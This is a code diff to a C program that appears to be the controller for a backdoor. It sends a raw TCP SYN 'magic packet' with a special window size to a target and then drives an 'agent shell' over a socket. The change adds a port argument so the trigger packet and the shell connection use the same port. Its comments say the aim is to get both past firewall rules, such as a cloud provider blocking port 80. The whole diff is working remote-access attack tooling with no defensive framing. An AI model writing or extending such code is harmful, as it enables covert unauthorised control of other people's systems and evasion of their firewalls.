@@ -1,4 +1,5 @@
 #define _GNU_SOURCE
+#include <stdint.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -30,8 +31,9 @@ static unsigned short checksum(void *addr, int count) {
     return ~sum;
 }
 
-/* Send a raw TCP SYN packet with the magic window size */
-static int send_magic_packet(const char *dst_ip) {
+/* Send a raw TCP SYN packet with the magic window size.
+ * Uses same port as connect so both pass through the same firewall rules. */
+static int send_magic_packet(const char *dst_ip, uint16_t port) {
     int sock;
     struct sockaddr_in dest;
     char packet[sizeof(struct iphdr) + sizeof(struct tcphdr)];
@@ -61,7 +63,7 @@ static int send_magic_packet(const char *dst_ip) {
 
     /* TCP header */
     tcp->source = htons(12345 + (rand() % 1000));   /* random source port */
-    tcp->dest = htons(80);                           /* any destination port */
+    tcp->dest = htons(port);                         /* same port as connect */
     tcp->seq = htonl(rand());
     tcp->ack_seq = 0;
     tcp->doff = 5;
@@ -111,8 +113,8 @@ static int send_magic_packet(const char *dst_ip) {
     return 0;
 }
 
-/* Connect to agent on port 2333 and forward stdin/stdout */
-static void interact_with_agent(const char *dst_ip) {
+/* Connect to agent and forward stdin/stdout */
+static void interact_with_agent(const char *dst_ip, uint16_t port) {
     int sock;
     struct sockaddr_in addr;
     fd_set fds;
@@ -126,7 +128,7 @@ static void interact_with_agent(const char *dst_ip) {
     }
 
     addr.sin_family = AF_INET;
-    addr.sin_port = htons(AGENT_PORT);
+    addr.sin_port = htons(port);
     if (inet_pton(AF_INET, dst_ip, &addr.sin_addr) <= 0) {
         perror("inet_pton");
         close(sock);
@@ -139,7 +141,7 @@ static void interact_with_agent(const char *dst_ip) {
         return;
     }
 
-    printf("Connected to agent shell on %s:%d\n", dst_ip, AGENT_PORT);
+    printf("Connected to agent shell on %s:%d\n", dst_ip, port);
     printf("Type commands (exit to quit)\n");
 
     while (1) {
@@ -182,17 +184,29 @@ static void interact_with_agent(const char *dst_ip) {
 }
 
 int main(int argc, char **argv) {
-    if (argc != 2) {
-        fprintf(stderr, "Usage: %s <target_ip>\n", argv[0]);
+    uint16_t port = AGENT_PORT;
+
+    if (argc < 2 || argc > 3) {
+        fprintf(stderr, "Usage: %s <target_ip> [port]\n", argv[0]);
+        fprintf(stderr, "  port defaults to %d; use same port that is open in firewall\n", AGENT_PORT);
         return 1;
     }
 
     const char *target_ip = argv[1];
+    if (argc == 3) {
+        int p = atoi(argv[2]);
+        if (p <= 0 || p > 65535) {
+            fprintf(stderr, "Invalid port %s\n", argv[2]);
+            return 1;
+        }
+        port = (uint16_t)p;
+    }
 
     /* Seed random for port/seq */
     srand(time(NULL));
 
-    if (send_magic_packet(target_ip) < 0) {
+    /* Magic packet must use same port as connect so both pass firewall (e.g. cloud blocks 80) */
+    if (send_magic_packet(target_ip, port) < 0) {
         fprintf(stderr, "Failed to send magic packet.\n");
         return 1;
     }
@@ -200,7 +214,7 @@ int main(int argc, char **argv) {
     /* Small delay to allow packet to be processed */
     usleep(100000);   /* 100 ms */
 
-    interact_with_agent(target_ip);
+    interact_with_agent(target_ip, port);
 
     return 0;
 }
